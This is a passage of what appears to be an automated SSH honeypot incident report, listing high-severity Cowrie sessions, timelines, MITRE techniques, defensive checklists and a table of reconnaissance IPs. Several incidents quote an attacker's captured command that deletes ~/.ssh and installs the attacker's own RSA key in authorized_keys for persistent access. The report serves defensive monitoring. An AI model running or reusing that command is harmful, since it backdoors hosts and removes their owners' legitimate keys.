- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07df16f19987

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 18:17 |
| **Last Seen** | 2026-09-03 18:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:17:49` | `cowrie.session.connect` |
| `2026-09-03 18:17:49` | `cowrie.client.version` |
| `2026-09-03 18:17:50` | `cowrie.client.kex` |
| `2026-09-03 18:17:50` | `cowrie.login.success` |
| `2026-09-03 18:17:51` | `cowrie.direct-tcpip.request` |
| `2026-09-03 18:17:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 18:17:51` | `cowrie.direct-tcpip.data` |
| `2026-09-03 18:17:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca2f500da4f5

| Field | Detail |
|---|---|
| **Source IP** | `115.190.197[.]74` |
| **First Seen** | 2026-09-03 18:21 |
| **Last Seen** | 2026-09-03 18:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:21:49` | `cowrie.session.connect` |
| `2026-09-03 18:21:49` | `cowrie.client.version` |
| `2026-09-03 18:21:50` | `cowrie.client.kex` |
| `2026-09-03 18:21:51` | `cowrie.login.success` |
| `2026-09-03 18:21:52` | `cowrie.session.params` |
| `2026-09-03 18:21:52` | `cowrie.command.input` |
| `2026-09-03 18:21:52` | `cowrie.command.failed` |
| `2026-09-03 18:21:53` | `cowrie.log.closed` |
| `2026-09-03 18:21:54` | `cowrie.session.params` |
| `2026-09-03 18:21:54` | `cowrie.command.input` |
| `2026-09-03 18:21:54` | `cowrie.session.file_download` |
| `2026-09-03 18:21:54` | `cowrie.log.closed` |
| `2026-09-03 18:21:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.197[.]74` to AbuseIPDB if not already reported
- [ ] Block `115.190.197[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-22e4d0fdd303

| Field | Detail |
|---|---|
| **Source IP** | `103.70.40[.]36` |
| **First Seen** | 2026-09-03 18:22 |
| **Last Seen** | 2026-09-03 18:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:22:22` | `cowrie.session.connect` |
| `2026-09-03 18:22:22` | `cowrie.client.version` |
| `2026-09-03 18:22:23` | `cowrie.client.kex` |
| `2026-09-03 18:22:24` | `cowrie.login.success` |
| `2026-09-03 18:22:25` | `cowrie.session.params` |
| `2026-09-03 18:22:25` | `cowrie.command.input` |
| `2026-09-03 18:22:25` | `cowrie.command.failed` |
| `2026-09-03 18:22:26` | `cowrie.log.closed` |
| `2026-09-03 18:22:27` | `cowrie.session.params` |
| `2026-09-03 18:22:27` | `cowrie.command.input` |
| `2026-09-03 18:22:28` | `cowrie.session.file_download` |
| `2026-09-03 18:22:28` | `cowrie.log.closed` |
| `2026-09-03 18:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.70.40[.]36` to AbuseIPDB if not already reported
- [ ] Block `103.70.40[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae3fbc316d54

| Field | Detail |
|---|---|
| **Source IP** | `103.70.40[.]36` |
| **First Seen** | 2026-09-03 18:22 |
| **Last Seen** | 2026-09-03 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:22:28` | `cowrie.session.connect` |
| `2026-09-03 18:22:28` | `cowrie.client.version` |
| `2026-09-03 18:22:28` | `cowrie.client.kex` |
| `2026-09-03 18:22:29` | `cowrie.login.success` |
| `2026-09-03 18:22:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.70.40[.]36` to AbuseIPDB if not already reported
- [ ] Block `103.70.40[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b22ae4e5c3d8

| Field | Detail |
|---|---|
| **Source IP** | `103.70.40[.]36` |
| **First Seen** | 2026-09-03 18:22 |
| **Last Seen** | 2026-09-03 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:22:30` | `cowrie.session.connect` |
| `2026-09-03 18:22:30` | `cowrie.client.version` |
| `2026-09-03 18:22:30` | `cowrie.client.kex` |
| `2026-09-03 18:22:32` | `cowrie.login.success` |
| `2026-09-03 18:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.70.40[.]36` to AbuseIPDB if not already reported
- [ ] Block `103.70.40[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2da2301ad29

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 18:24 |
| **Last Seen** | 2026-09-03 18:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:24:20` | `cowrie.session.connect` |
| `2026-09-03 18:24:20` | `cowrie.client.version` |
| `2026-09-03 18:24:21` | `cowrie.client.kex` |
| `2026-09-03 18:24:22` | `cowrie.login.success` |
| `2026-09-03 18:24:22` | `cowrie.direct-tcpip.request` |
| `2026-09-03 18:24:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 18:24:22` | `cowrie.direct-tcpip.data` |
| `2026-09-03 18:24:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-777f79247537

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]241` |
| **First Seen** | 2026-09-03 18:24 |
| **Last Seen** | 2026-09-03 18:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:24:26` | `cowrie.session.connect` |
| `2026-09-03 18:24:26` | `cowrie.client.version` |
| `2026-09-03 18:24:26` | `cowrie.client.kex` |
| `2026-09-03 18:24:27` | `cowrie.login.success` |
| `2026-09-03 18:24:28` | `cowrie.session.params` |
| `2026-09-03 18:24:28` | `cowrie.command.input` |
| `2026-09-03 18:24:28` | `cowrie.command.failed` |
| `2026-09-03 18:24:29` | `cowrie.log.closed` |
| `2026-09-03 18:24:30` | `cowrie.session.params` |
| `2026-09-03 18:24:30` | `cowrie.command.input` |
| `2026-09-03 18:24:30` | `cowrie.session.file_download` |
| `2026-09-03 18:24:30` | `cowrie.log.closed` |
| `2026-09-03 18:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]241` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af1d1dc8d529

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]241` |
| **First Seen** | 2026-09-03 18:24 |
| **Last Seen** | 2026-09-03 18:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:24:30` | `cowrie.session.connect` |
| `2026-09-03 18:24:30` | `cowrie.client.version` |
| `2026-09-03 18:24:31` | `cowrie.client.kex` |
| `2026-09-03 18:24:32` | `cowrie.login.success` |
| `2026-09-03 18:24:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]241` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2057720450a9

| Field | Detail |
|---|---|
| **Source IP** | `163.7.3[.]241` |
| **First Seen** | 2026-09-03 18:24 |
| **Last Seen** | 2026-09-03 18:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:24:32` | `cowrie.session.connect` |
| `2026-09-03 18:24:32` | `cowrie.client.version` |
| `2026-09-03 18:24:33` | `cowrie.client.kex` |
| `2026-09-03 18:24:34` | `cowrie.login.success` |
| `2026-09-03 18:24:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.3[.]241` to AbuseIPDB if not already reported
- [ ] Block `163.7.3[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d315f992ceb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 18:27 |
| **Last Seen** | 2026-09-03 18:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:27:25` | `cowrie.session.connect` |
| `2026-09-03 18:27:25` | `cowrie.client.version` |
| `2026-09-03 18:27:25` | `cowrie.client.kex` |
| `2026-09-03 18:27:26` | `cowrie.login.success` |
| `2026-09-03 18:27:26` | `cowrie.direct-tcpip.request` |
| `2026-09-03 18:27:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 18:27:26` | `cowrie.direct-tcpip.data` |
| `2026-09-03 18:27:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54224474ee82

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 18:35 |
| **Last Seen** | 2026-09-03 18:35 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:35:12` | `cowrie.session.connect` |
| `2026-09-03 18:35:12` | `cowrie.client.version` |
| `2026-09-03 18:35:12` | `cowrie.client.kex` |
| `2026-09-03 18:35:13` | `cowrie.login.success` |
| `2026-09-03 18:35:13` | `cowrie.direct-tcpip.request` |
| `2026-09-03 18:35:14` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 18:35:14` | `cowrie.direct-tcpip.data` |
| `2026-09-03 18:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0f232c0006c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 18:37 |
| **Last Seen** | 2026-09-03 18:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:37:04` | `cowrie.session.connect` |
| `2026-09-03 18:37:04` | `cowrie.client.version` |
| `2026-09-03 18:37:04` | `cowrie.client.kex` |
| `2026-09-03 18:37:05` | `cowrie.login.success` |
| `2026-09-03 18:37:06` | `cowrie.direct-tcpip.request` |
| `2026-09-03 18:37:06` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 18:37:06` | `cowrie.direct-tcpip.data` |
| `2026-09-03 18:37:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84419797ae62

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 18:46 |
| **Last Seen** | 2026-09-03 18:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:46:20` | `cowrie.session.connect` |
| `2026-09-03 18:46:20` | `cowrie.client.version` |
| `2026-09-03 18:46:20` | `cowrie.client.kex` |
| `2026-09-03 18:46:21` | `cowrie.login.success` |
| `2026-09-03 18:46:21` | `cowrie.direct-tcpip.request` |
| `2026-09-03 18:46:22` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 18:46:22` | `cowrie.direct-tcpip.data` |
| `2026-09-03 18:46:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-95171f077912

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-03 18:46 |
| **Last Seen** | 2026-09-03 18:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:46:22` | `cowrie.session.connect` |
| `2026-09-03 18:46:22` | `cowrie.client.version` |
| `2026-09-03 18:46:23` | `cowrie.client.kex` |
| `2026-09-03 18:46:23` | `cowrie.login.success` |
| `2026-09-03 18:46:23` | `cowrie.direct-tcpip.request` |
| `2026-09-03 18:46:23` | `cowrie.direct-tcpip.data` |
| `2026-09-03 18:46:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d7369f0c301

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-09-03 18:46 |
| **Last Seen** | 2026-09-03 18:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:46:54` | `cowrie.session.connect` |
| `2026-09-03 18:46:54` | `cowrie.client.version` |
| `2026-09-03 18:46:54` | `cowrie.client.kex` |
| `2026-09-03 18:46:56` | `cowrie.login.success` |
| `2026-09-03 18:46:56` | `cowrie.direct-tcpip.request` |
| `2026-09-03 18:46:57` | `cowrie.direct-tcpip.ja4h` |
| `2026-09-03 18:46:57` | `cowrie.direct-tcpip.data` |
| `2026-09-03 18:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb04279c4a85

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-03 18:53 |
| **Last Seen** | 2026-09-03 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:53:28` | `cowrie.session.connect` |
| `2026-09-03 18:53:28` | `cowrie.client.version` |
| `2026-09-03 18:53:28` | `cowrie.client.kex` |
| `2026-09-03 18:53:29` | `cowrie.login.success` |
| `2026-09-03 18:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f3704a78d93

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-09-03 18:53 |
| **Last Seen** | 2026-09-03 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-03 18:53:28` | `cowrie.session.connect` |
| `2026-09-03 18:53:28` | `cowrie.client.version` |
| `2026-09-03 18:53:29` | `cowrie.client.kex` |
| `2026-09-03 18:53:29` | `cowrie.login.success` |
| `2026-09-03 18:53:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `36.133.163[.]5` | **7** | 2026-09-03 16:42 | 2026-09-03 17:48 | 14m | 0 | `T1592` | 🟢 LOW |
| `103.237.115[.]58` | **4** | 2026-09-03 18:03 | 2026-09-03 18:06 | 4m | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | **3** | 2026-09-03 14:27 | 2026-09-03 15:23 | 5m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | **3** | 2026-09-03 16:29 | 2026-09-03 16:51 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.172[.]176` | **3** | 2026-09-03 15:35 | 2026-09-03 15:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]118` | **3** | 2026-09-03 15:35 | 2026-09-03 15:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]49` | **3** | 2026-09-03 15:35 | 2026-09-03 15:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]14` | **3** | 2026-09-03 14:28 | 2026-09-03 15:39 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `118.196.79[.]21` | **2** | 2026-09-03 18:11 | 2026-09-03 18:13 | 2m | 0 | `T1592` | 🟢 LOW |
| `140.206.107[.]98` | **2** | 2026-09-03 13:52 | 2026-09-03 14:09 | 4m | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]111` | **2** | 2026-09-03 14:44 | 2026-09-03 14:44 | 0m | 0 | `T1592` | 🟢 LOW |
| `173.163.62[.]137` | **2** | 2026-09-03 14:46 | 2026-09-03 14:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `186.158.120[.]56` | **2** | 2026-09-03 17:29 | 2026-09-03 17:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.121.125[.]236` | **2** | 2026-09-03 17:14 | 2026-09-03 17:14 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]205` | **2** | 2026-09-03 13:22 | 2026-09-03 13:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | **2** | 2026-09-03 14:13 | 2026-09-03 14:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | **2** | 2026-09-03 14:15 | 2026-09-03 14:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `94.102.49[.]155` | **2** | 2026-09-03 16:13 | 2026-09-03 16:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `111.39.190[.]137` | 1 | 2026-09-03 12:58 | 2026-09-03 12:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `113.88.76[.]73` | 1 | 2026-09-03 14:38 | 2026-09-03 14:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.161[.]159` | 1 | 2026-09-03 14:13 | 2026-09-03 14:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.191.27[.]238` | 1 | 2026-09-03 13:17 | 2026-09-03 13:19 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.91.35[.]169` | 1 | 2026-09-03 14:08 | 2026-09-03 14:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.184[.]79` | 1 | 2026-09-03 14:32 | 2026-09-03 14:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.91.179[.]29` | 1 | 2026-09-03 16:06 | 2026-09-03 16:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `186.220.25[.]192` | 1 | 2026-09-03 14:01 | 2026-09-03 14:01 | 11s | 0 | `T1592` | 🟢 LOW |
| `190.13.164[.]162` | 1 | 2026-09-03 18:14 | 2026-09-03 18:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.90.12[.]122` | 1 | 2026-09-03 17:43 | 2026-09-03 17:44 | 42s | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]165` | 1 | 2026-09-03 16:18 | 2026-09-03 16:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.211.212[.]249` | 1 | 2026-09-03 12:58 | 2026-09-03 12:58 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.211.212[.]252` | 1 | 2026-09-03 13:01 | 2026-09-03 13:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `216.218.206[.]68` | 1 | 2026-09-03 14:18 | 2026-09-03 14:18 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-09-03 13:02 | 2026-09-03 13:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.171.126[.]35` | 1 | 2026-09-03 14:06 | 2026-09-03 14:06 | 12s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-09-03 18:03 | 2026-09-03 18:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-09-03 13:37 | 2026-09-03 13:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.165.156[.]118` | 1 | 2026-09-03 13:03 | 2026-09-03 13:03 | 12s | 0 | `T1592` | 🟢 LOW |
| `59.63.188[.]244` | 1 | 2026-09-03 13:27 | 2026-09-03 13:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `68.1.135[.]189` | 1 | 2026-09-03 14:09 | 2026-09-03 14:10 | 14s | 0 | `T1592` | 🟢 LOW |
| `69.117.41[.]89` | 1 | 2026-09-03 17:38 | 2026-09-03 17:38 | 13s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-09-03 18:44 | 2026-09-03 18:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.64.155[.]8` | 1 | 2026-09-03 15:00 | 2026-09-03 15:00 | 13s | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]121` | 1 | 2026-09-03 18:06 | 2026-09-03 18:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]11` | 1 | 2026-09-03 16:13 | 2026-09-03 16:13 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
